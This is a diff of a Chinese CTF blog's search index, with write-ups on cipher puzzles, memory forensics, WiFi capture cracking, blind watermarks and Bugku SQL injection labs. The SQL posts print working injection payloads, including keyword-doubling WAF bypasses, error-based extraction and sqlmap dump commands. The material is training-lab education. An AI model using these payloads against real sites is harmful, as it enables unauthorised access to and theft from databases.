@@ -1,116 +1,60 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-    
-    <entry>
-      <title>新疆首届知识技能大赛相关writeup</title>
-      <link href="/2018/09/16/%E6%96%B0%E7%96%86%E9%A6%96%E5%B1%8A%E7%9F%A5%E8%AF%86%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E7%9B%B8%E5%85%B3writeup/"/>
-      <url>/2018/09/16/%E6%96%B0%E7%96%86%E9%A6%96%E5%B1%8A%E7%9F%A5%E8%AF%86%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E7%9B%B8%E5%85%B3writeup/</url>
-      <content type="html"><![CDATA[<p>总是把比赛想的太简单，原来在哪里总是藏龙卧虎，不能小瞧任何人，也别高看了自己。但是这是第一次参加<strong>不让联网</strong>的CTF比赛！</p><blockquote><p>stay foolish,stay hungry</p></blockquote><h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p>通过这个题目，让我联想到与佛论禅和rot13加密，那么打开题目，下载下来一个docx文档。下面加粗的文字即是打开文档的内容。</p><p><strong>夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮</strong></p><p>首先我们打开<a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a>，在其加密内容前加上<strong>佛曰：</strong>。如图所下：<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/1.png" alt="1.png"><br>下面是这个解出来密文，显然还有一层加密。<br><code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code><br>猜测<del>base64</del>编码，结果没有解出来。联系题目猜测为rot13加密<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/2.png" alt="2.png"><br>解码出来继续base64解码，在此之后我会写相关的加密的详解。<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/3.png" alt="3.png"></p><hr><h2 id="取证内存镜像flag"><a href="#取证内存镜像flag" class="headerlink" title="取证内存镜像flag"></a>取证内存镜像flag</h2><p>这道题给了hint才知道是内存取证，但是因为自己起初没在意相关工具的使用<del>其实就是自己懒</del>，那么这次的惨败正好弥补自己的不足。</p><p>volatility是专门进行内存取证的工具，对于windows系统比较友好，linux系统需要单独的安装相应的插件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-f  选择所要取证的镜像文件</span><br></pre></td></tr></table></figure></p><p>进行镜像识别<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imageinfo</span><br></pre></td></tr></table></figure></p><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/4.jpg" alt="4.jpg"><br>我们可以发现volatility建议我们使用<strong>WinXPSP2x86</strong>，那么继续使用查看当时的dump下来的内存中存在的进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--profile  使用哪一种镜像进行取证</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pslist  查看当时dump下来所运行的进程</span><br></pre></td></tr></table></figure><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/5.jpg" alt="5.jpg"><br>然而根据题目，我们猜测应该在是某个文件，那么扫描目录，其中为了查询相关字符，进行了管道命令以及<code>grep</code>进行筛选。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filescan  文件扫描</span><br></pre></td></tr></table></figure></p><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/6.png" alt="6.png"><br>那么下面我就进行导出其相关文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dumpfiles 导出文件</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Q   所要导出文件的地址</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--dump-dir  导出文件所要存在那个目录里</span><br></pre></td></tr></table></figure><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/7.png" alt="7.png"><br>打开发现这个压缩包需要密码，我猜测了许多种可能，密码应该在剪切板中，于是搜索剪切板的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clipboard    查看剪切板的内容</span><br></pre></td></tr></table></figure></p><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/8.png" alt="8.png"><br>于是尝试是否这个剪切板的内容就是密码，获得flag<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/9.png" alt="9.png"></p><blockquote><p>这个是<strong>真·取证</strong>，让我感觉到这个CTF还是能够提高我在安全的其他方面的。</p></blockquote><hr><h2 id="流量包解密02"><a href="#流量包解密02" class="headerlink" title="流量包解密02"></a>流量包解密02</h2><p>&nbsp;&nbsp;果然还是见识少，所有的比赛的束手无措只是自己平时懒所付出的代价。<br>下载下来一看，文件是<code>.cap</code>结尾的格式，那么应该是WiFi所抓下来的包，而且题目提示密码就是本机的MAC地址。那么我们需要用到<strong>aircrack-ng</strong>工具解密流量。</p><p>先用wireshark打开流量包可以看到我们MAC地址（无线&gt;wlan流量）<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/10.png" alt="10.png"></p><p>aircrack-ng解密流量，有个坑<strong>密码MAC地址大写</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-w   使用密码字典</span><br></pre></td></tr></table></figure></p><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/11.jpg" alt="11.jpg"><br>然后将key值导入进去(<strong>首选项&gt;protpcols&gt;IEEE 802.11&gt;Decryption key&gt;wpa-key</strong>)<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/12.png" alt="12.png"><br>然后追踪TCP流<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/13.png" alt="13.png"><br>最后查看网址找到了flag<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/14.png" alt="14.png"></p><hr><h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p><a href="https://blog.csdn.net/qq_28208251/article/details/48093575" target="_blank" rel="noopener">https://blog.csdn.net/qq_28208251/article/details/48093575</a><br><a href="https://xz.aliyun.com/t/1972" target="_blank" rel="noopener">https://xz.aliyun.com/t/1972</a><br><a href="http://netsecurity.51cto.com/art/201105/264844.htm" target="_blank" rel="noopener">http://netsecurity.51cto.com/art/201105/264844.htm</a><br><a href="https://blog.csdn.net/dmbjzhh/article/details/79425483" target="_blank" rel="noopener">https://blog.csdn.net/dmbjzhh/article/details/79425483</a></p><blockquote><p><strong>如果有同学需要上述题目，请联系我</strong></p></blockquote>]]></content>
-      
+<search>
+  <entry>
+    <title><![CDATA[新疆首届知识技能大赛相关writeup]]></title>
+    <url>%2F2018%2F09%2F16%2F%E6%96%B0%E7%96%86%E9%A6%96%E5%B1%8A%E7%9F%A5%E8%AF%86%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E7%9B%B8%E5%85%B3writeup%2F</url>
+    <content type="text"><![CDATA[总是把比赛想的太简单，原来在哪里总是藏龙卧虎，不能小瞧任何人，也别高看了自己。但是这是第一次参加不让联网的CTF比赛！ stay foolish,stay hungry 如来十三掌通过这个题目，让我联想到与佛论禅和rot13加密，那么打开题目，下载下来一个docx文档。下面加粗的文字即是打开文档的内容。 夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮 首先我们打开与佛论禅，在其加密内容前加上佛曰：。如图所下：下面是这个解出来密文，显然还有一层加密。MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9猜测base64编码，结果没有解出来。联系题目猜测为rot13加密解码出来继续base64解码，在此之后我会写相关的加密的详解。 取证内存镜像flag这道题给了hint才知道是内存取证，但是因为自己起初没在意相关工具的使用其实就是自己懒，那么这次的惨败正好弥补自己的不足。 volatility是专门进行内存取证的工具，对于windows系统比较友好，linux系统需要单独的安装相应的插件。1-f 选择所要取证的镜像文件 进行镜像识别1imageinfo 我们可以发现volatility建议我们使用WinXPSP2x86，那么继续使用查看当时的dump下来的内存中存在的进程1--profile 使用哪一种镜像进行取证 1pslist 查看当时dump下来所运行的进程 然而根据题目，我们猜测应该在是某个文件，那么扫描目录，其中为了查询相关字符，进行了管道命令以及grep进行筛选。1filescan 文件扫描 那么下面我就进行导出其相关文件。1dumpfiles 导出文件 1-Q 所要导出文件的地址 1--dump-dir 导出文件所要存在那个目录里 打开发现这个压缩包需要密码，我猜测了许多种可能，密码应该在剪切板中，于是搜索剪切板的内容1clipboard 查看剪切板的内容 于是尝试是否这个剪切板的内容就是密码，获得flag 这个是真·取证，让我感觉到这个CTF还是能够提高我在安全的其他方面的。 流量包解密02&nbsp;&nbsp;果然还是见识少，所有的比赛的束手无措只是自己平时懒所付出的代价。下载下来一看，文件是.cap结尾的格式，那么应该是WiFi所抓下来的包，而且题目提示密码就是本机的MAC地址。那么我们需要用到aircrack-ng工具解密流量。 先用wireshark打开流量包可以看到我们MAC地址（无线&gt;wlan流量） aircrack-ng解密流量，有个坑密码MAC地址大写1-w 使用密码字典 然后将key值导入进去(首选项&gt;protpcols&gt;IEEE 802.11&gt;Decryption key&gt;wpa-key)然后追踪TCP流最后查看网址找到了flag Refererhttps://blog.csdn.net/qq_28208251/article/details/48093575https://xz.aliyun.com/t/1972http://netsecurity.51cto.com/art/201105/264844.htmhttps://blog.csdn.net/dmbjzhh/article/details/79425483 如果有同学需要上述题目，请联系我]]></content>
       <categories>
-          
-          <category> CTF </category>
-          
+        <category>CTF</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 比赛wp </tag>
-            
-            <tag> CRYPTO </tag>
-            
-            <tag> MISC </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
-      <title>照片里的盲水印</title>
-      <link href="/2018/09/02/%E7%85%A7%E7%89%87%E9%87%8C%E7%9A%84%E7%9B%B2%E6%B0%B4%E5%8D%B0/"/>
-      <url>/2018/09/02/%E7%85%A7%E7%89%87%E9%87%8C%E7%9A%84%E7%9B%B2%E6%B0%B4%E5%8D%B0/</url>
-      <content type="html"><![CDATA[<p>这个题是安恒月赛里面的一道misc类型的题，在CTF中misc所谓最考验你的脑洞和检验你的<del>赛事水平</del>（赛棍？？？）<br><img src="/2018/09/02/照片里的盲水印/1.jpg" height="150px" width="150px"><br>但是这个方面还是要看一下，就当做开发脑力了。</p><p><strong>题目：暴力可解</strong><br><a href="https://pan.baidu.com/s/1GI9TlX3PtytDs0g6w-s3PQ" target="_blank" rel="noopener">题目文件</a><br>下载下来题目，打开压缩包解压发现有密码，猜测压缩包伪加密，使用010editor发现并没有伪加密，联系题目使用暴力破解，基本CTF所有让你暴力破解都是<strong>纯数字类型</strong>。<br><img src="/2018/09/02/照片里的盲水印/2.jpg" alt="暴力破解"><br>获得密码，解压得到两张相同的图片。<br><img src="/2018/09/02/照片里的盲水印/3.png" alt="解压所得图片"><br>在misc中，两张相同的图片基本上都应该是<strong>盲水印</strong>，所以使用bwm脚本（python2）。bwm脚本的<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">github</a><br>运行脚本发现没有cv2这个模块，使用下面的命令安装cv2<br><code>pip install opencv-python</code><br>然后运行<code>python bwm.py decode 1.png 2.png flag.png</code>。其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。下图即为水印。<br><img src="/2018/09/02/照片里的盲水印/4.png" alt="flag"></p>]]></content>
-      
+      <tags>
+        <tag>比赛wp</tag>
+        <tag>CRYPTO</tag>
+        <tag>MISC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[照片里的盲水印]]></title>
+    <url>%2F2018%2F09%2F02%2F%E7%85%A7%E7%89%87%E9%87%8C%E7%9A%84%E7%9B%B2%E6%B0%B4%E5%8D%B0%2F</url>
+    <content type="text"><![CDATA[这个题是安恒月赛里面的一道misc类型的题，在CTF中misc所谓最考验你的脑洞和检验你的赛事水平（赛棍？？？）但是这个方面还是要看一下，就当做开发脑力了。 题目：暴力可解题目文件下载下来题目，打开压缩包解压发现有密码，猜测压缩包伪加密，使用010editor发现并没有伪加密，联系题目使用暴力破解，基本CTF所有让你暴力破解都是纯数字类型。获得密码，解压得到两张相同的图片。在misc中，两张相同的图片基本上都应该是盲水印，所以使用bwm脚本（python2）。bwm脚本的github运行脚本发现没有cv2这个模块，使用下面的命令安装cv2pip install opencv-python然后运行python bwm.py decode 1.png 2.png flag.png。其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。下图即为水印。]]></content>
       <categories>
-          
-          <category> CTF </category>
-          
+        <category>CTF</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> MISC </tag>
-            
-            <tag> 盲水印 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
-      <title>SQL报错注入</title>
-      <link href="/2018/08/17/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
-      <url>/2018/08/17/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
-      <content type="html"><![CDATA[<p>快草了两个月的bugku-web类型的题，感觉基本web类型都有了一些大概的了解，当然比不上dalao的掌控雷电的操作，后面就是多玩一会python了，毕竟CTF中脚本不会写是真的硬伤。</p><p>这道题是web-150分的题，看了一下网上的WP不多，我也是找了一堆资料，看了看相似的体型才把这道题做的差不多。</p><p>题名：多次，<a href="http://120.24.86.145:9004/1ndex.php?id=1" target="_blank" rel="noopener">网址链接</a></p><p>首先打开网页看到id这个参数，很经典的SQL注入。于是测试单引号过滤<strong>?id=1’</strong>，页面发生变化，猜测位查询语句为单引号闭合。<br><img src="/2018/08/17/SQL报错注入/1.png" alt=""><br>再次进行测试，<strong>?id=1′ or 1=1%23 </strong>，发现并无变化。<br><img src="/2018/08/17/SQL报错注入/2.png" alt=""><br>猜测可能有WAF过滤，于是测试双重写or，<strong>?id=1′ oorr 1=1%23</strong> ，测试发现页面改变<br><img src="/2018/08/17/SQL报错注入/3.png" alt=""></p><p>进行测试过滤，使用异或符号（^）搭配length函数开始测试。</p><p><em>如何判断是否过滤，例如union函数没有过滤，那么length(‘union’)=0是不成立的，即该语句布尔值为0，并且前面的查询语句布尔值恒等于1，1^0=1，1^1=0。则为1返回正常页面，不正常返回错误页面。</em><br><img src="/2018/08/17/SQL报错注入/4.png" alt=""><br>经测试：or，and，union，select被过滤。那么接下来就是常规测试。</p><p><strong>?id=1%27 oorrder by 2%23</strong>，测试列数为2。（注意order里面的or）<br><img src="/2018/08/17/SQL报错注入/5.png" alt=""></p><h1 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h1><p>?id=-1%27 uniounionn selecselectt 1,group_concat(schema_name) from infoorrmation_schema.schemata%23（坑点：<strong>information里面的or</strong>）<br><img src="/2018/08/17/SQL报错注入/6.png" alt=""></p><h1 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h1><p>?id=-1%27 uniounionn selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=0x776562313030322d31（十六进制码为web1002-1）%23<br><img src="/2018/08/17/SQL报错注入/7.png" alt=""></p><h1 id="爆出数据"><a href="#爆出数据" class="headerlink" title="爆出数据"></a>爆出数据</h1><p>?id=-1%27 uniounionn selecselectt 1,flag1 from flag1 %23<br><img src="/2018/08/17/SQL报错注入/8.png" alt=""><br>然后题目提示还有一个flag在下一关的地址。根据上面的操作，地址可能在address列里。</p><h1 id="寻找下一关地址"><a href="#寻找下一关地址" class="headerlink" title="寻找下一关地址"></a>寻找下一关地址</h1><p>?id=-1%27 uniounionn selecselectt 1,address from flag1 %23<br><img src="/2018/08/17/SQL报错注入/9.png" alt=""></p><h2 id="找到下一关地址"><a href="#找到下一关地址" class="headerlink" title="找到下一关地址"></a>找到下一关地址</h2><p><img src="/2018/08/17/SQL报错注入/10.png" alt=""><br>OK，还是向上面的一样测试，发现还是单引号过滤。<br><img src="/2018/08/17/SQL报错注入/11.png" alt=""><br>发现还是有回显我们测试的语句，突然发现这个WAF过滤的有点奇怪，这个过滤了union<br><img src="/2018/08/17/SQL报错注入/12.png" alt=""><br>那我将union重写，发现直接不回显，可能是后端的专门对这种产生过滤。<br><img src="/2018/08/17/SQL报错注入/13.PNG" alt=""><br>因为还发现有报错产生，那么我就进行报错盲注测试。</p><p>盲注测试公式：<strong>union select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x;</strong></p><p>其中<strong>version()</strong>改成相应的注入语句。公式需要灵活变通，例如本题中的union被过滤，那么将语句改为or and连接的形式，并且适当添加相应的列数。Ps：盲注相关原理在文章末尾链接。</p><p> <em>or (select 1 from(select count(</em>),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)<em>2))x from information_schema.schemata group by x)a)%23</em></p><p>因为不能用union进行注入，所以改变一下形式使用or，就这个走了好多弯路，因为or只能使用1个跟1个比，否则将会出错<strong>Operand should contain 1 column(s) </strong>, 且(select count(<em>),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)</em>2))x from information_schema.schemata group by x)这条语句将会产生一个虚拟表，你在虚拟表进行查询时需要起一个别名，我在这里起的a，于是报错爆来数据库，下面的操作跟第一关一样。<br><img src="/2018/08/17/SQL报错注入/14.png" alt=""><br>但是其中爆数据时产生了一些问题，说是子查询返回超过了一行但是猜测肯定是只有一行的，估计是出题人加了回车产生了换行。<br><img src="/2018/08/17/SQL报错注入/15.png" alt=""><br>解决方法：left((select flag2 from flag2),40)，取前40个字符。<br><img src="/2018/08/17/SQL报错注入/16.png" alt=""></p><h2 id="相关链接："><a href="#相关链接：" class="headerlink" title="相关链接："></a>相关链接：</h2><p><a href="https://blog.csdn.net/qq_35544379/article/details/77453019" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/77453019</a></p><p><a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/80455884</a></p><p><a href="http://wyb0.com/" target="_blank" rel="noopener">http://wyb0.com/</a></p><blockquote><p><strong>两天时间全部花费在这个报错注入上，不过懂了好多SQL上的东西，也算是少有收获。</strong></p></blockquote>]]></content>
-      
+      <tags>
+        <tag>MISC</tag>
+        <tag>盲水印</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SQL报错注入]]></title>
+    <url>%2F2018%2F08%2F17%2FSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[快草了两个月的bugku-web类型的题，感觉基本web类型都有了一些大概的了解，当然比不上dalao的掌控雷电的操作，后面就是多玩一会python了，毕竟CTF中脚本不会写是真的硬伤。 这道题是web-150分的题，看了一下网上的WP不多，我也是找了一堆资料，看了看相似的体型才把这道题做的差不多。 题名：多次，网址链接 首先打开网页看到id这个参数，很经典的SQL注入。于是测试单引号过滤?id=1’，页面发生变化，猜测位查询语句为单引号闭合。再次进行测试，?id=1′ or 1=1%23 ，发现并无变化。猜测可能有WAF过滤，于是测试双重写or，?id=1′ oorr 1=1%23 ，测试发现页面改变 进行测试过滤，使用异或符号（^）搭配length函数开始测试。 如何判断是否过滤，例如union函数没有过滤，那么length(‘union’)=0是不成立的，即该语句布尔值为0，并且前面的查询语句布尔值恒等于1，1^0=1，1^1=0。则为1返回正常页面，不正常返回错误页面。经测试：or，and，union，select被过滤。那么接下来就是常规测试。 ?id=1%27 oorrder by 2%23，测试列数为2。（注意order里面的or） 爆数据库?id=-1%27 uniounionn selecselectt 1,group_concat(schema_name) from infoorrmation_schema.schemata%23（坑点：information里面的or） 爆表?id=-1%27 uniounionn selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=0x776562313030322d31（十六进制码为web1002-1）%23 爆出数据?id=-1%27 uniounionn selecselectt 1,flag1 from flag1 %23然后题目提示还有一个flag在下一关的地址。根据上面的操作，地址可能在address列里。 寻找下一关地址?id=-1%27 uniounionn selecselectt 1,address from flag1 %23 找到下一关地址OK，还是向上面的一样测试，发现还是单引号过滤。发现还是有回显我们测试的语句，突然发现这个WAF过滤的有点奇怪，这个过滤了union那我将union重写，发现直接不回显，可能是后端的专门对这种产生过滤。因为还发现有报错产生，那么我就进行报错盲注测试。 盲注测试公式：union select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x; 其中version()改成相应的注入语句。公式需要灵活变通，例如本题中的union被过滤，那么将语句改为or and连接的形式，并且适当添加相应的列数。Ps：盲注相关原理在文章末尾链接。 or (select 1 from(select count(),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)2))x from information_schema.schemata group by x)a)%23 因为不能用union进行注入，所以改变一下形式使用or，就这个走了好多弯路，因为or只能使用1个跟1个比，否则将会出错Operand should contain 1 column(s) , 且(select count(),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)2))x from information_schema.schemata group by x)这条语句将会产生一个虚拟表，你在虚拟表进行查询时需要起一个别名，我在这里起的a，于是报错爆来数据库，下面的操作跟第一关一样。但是其中爆数据时产生了一些问题，说是子查询返回超过了一行但是猜测肯定是只有一行的，估计是出题人加了回车产生了换行。解决方法：left((select flag2 from flag2),40)，取前40个字符。 相关链接：https://blog.csdn.net/qq_35544379/article/details/77453019 https://blog.csdn.net/he_and/article/details/80455884 http://wyb0.com/ 两天时间全部花费在这个报错注入上，不过懂了好多SQL上的东西，也算是少有收获。]]></content>
       <categories>
-          
-          <category> CTF </category>
-          
+        <category>CTF</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> SQLinjection </tag>
-            
-            <tag> 手动注入 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
-      <title>SQLMAP-POST注入</title>
-      <link href="/2018/08/17/SQLMAP-POST%E6%B3%A8%E5%85%A5/"/>
-      <url>/2018/08/17/SQLMAP-POST%E6%B3%A8%E5%85%A5/</url>
-      <content type="html"><![CDATA[<p>BUGKU-ctf作为国内著名的ctf联系靶场，拥有丰富的题型加强我们的ctf水平。下面就是一次我认为比较典型的sql post注入题型。</p><p><center><strong>抓包，复制出来打成一个txt文件</strong></center><br><img src="/2018/08/17/SQLMAP-POST注入/1.png" alt="抓包内容"></p><p><center><strong>sqlmap -r test.txt -p admin_name –dbs</strong></center><br>因为博主懒的没有在win环境下下载sqlmap，使用kali中自带sqlmap工具。下面简单解释一下工具命令。<br><img src="/2018/08/17/SQLMAP-POST注入/2.png" alt=""></p><ul><li><p>-r  指定一个文件。</p></li><li><p>-p 指定参数，如图我指定提交表单中的admin_name作为参数进行注入。</p></li><li><p>–dbs 爆出所有的数据库。</p></li></ul><p>点击回车运行，竟然发现无法进行sql注入！</p><p><img src="/2018/08/17/SQLMAP-POST注入/3.png" alt=""><br>上图是我进行注入失败，后面继续追加了下面的参数</p><ul><li><p>-v  这个是展现攻击测试的详细过程的程度，一般设为3就足够。</p></li><li><p>–threads 这个见词知意，为线程数，博主一般将此设为10，这个根据每个人的电脑配置，酌情增加。</p></li></ul><center><strong>sqlmap -r test.txt -p admin_name –dbs –threads 10 -v 3 –level 3</strong></center><p><img src="/2018/08/17/SQLMAP-POST注入/4.PNG" alt=""><br>如图，发现这个SQL注入并不是平常的单引号闭合，而是双引号闭合，而sqlmap只有在level=3时才会测试双引号。</p><p>解释参数：</p><ul><li>–level 这个参数表示sqlmap进行测试的程度，数值为1~5，一般将其设为3，因为如果你给的数值越大，代表工具会变慢，很容易影响进度。<br><center><strong>sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 –table</strong></center><br><center><strong>sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 -T flag1 -C flag1 –dump</strong></center><br>这些就是爆表，爆字段，跟平常的sqlmap使用并无区别，因此不再做详细解释。</li></ul><p>解释参数：</p><ul><li><p>-D 指定数据库。</p></li><li><p>-T  指定表。</p></li><li><p>–table  数据库爆表名。</p></li><li><p>–dump 显示所有字段。</p></li></ul><hr><p><a href="http://120.24.86.145:9001/sql/" target="_blank" rel="noopener">题目地址</a></p>]]></content>
-      
+      <tags>
+        <tag>SQLinjection</tag>
+        <tag>手动注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SQLMAP-POST注入]]></title>
+    <url>%2F2018%2F08%2F17%2FSQLMAP-POST%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[BUGKU-ctf作为国内著名的ctf联系靶场，拥有丰富的题型加强我们的ctf水平。下面就是一次我认为比较典型的sql post注入题型。 抓包，复制出来打成一个txt文件 sqlmap -r test.txt -p admin_name –dbs因为博主懒的没有在win环境下下载sqlmap，使用kali中自带sqlmap工具。下面简单解释一下工具命令。 -r 指定一个文件。 -p 指定参数，如图我指定提交表单中的admin_name作为参数进行注入。 –dbs 爆出所有的数据库。 点击回车运行，竟然发现无法进行sql注入！ 上图是我进行注入失败，后面继续追加了下面的参数 -v 这个是展现攻击测试的详细过程的程度，一般设为3就足够。 –threads 这个见词知意，为线程数，博主一般将此设为10，这个根据每个人的电脑配置，酌情增加。 sqlmap -r test.txt -p admin_name –dbs –threads 10 -v 3 –level 3 如图，发现这个SQL注入并不是平常的单引号闭合，而是双引号闭合，而sqlmap只有在level=3时才会测试双引号。 解释参数： –level 这个参数表示sqlmap进行测试的程度，数值为1~5，一般将其设为3，因为如果你给的数值越大，代表工具会变慢，很容易影响进度。sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 –tablesqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 -T flag1 -C flag1 –dump这些就是爆表，爆字段，跟平常的sqlmap使用并无区别，因此不再做详细解释。 解释参数： -D 指定数据库。 -T 指定表。 –table 数据库爆表名。 –dump 显示所有字段。 题目地址]]></content>
       <categories>
-          
-          <category> CTF </category>
-          
+        <category>CTF</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> kali </tag>
-            
-            <tag> SQLinjection </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
-      <title>Hello World</title>
-      <link href="/2018/07/23/hello-world/"/>
-      <url>/2018/07/23/hello-world/</url>
-      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
-      
-      
-        <tags>
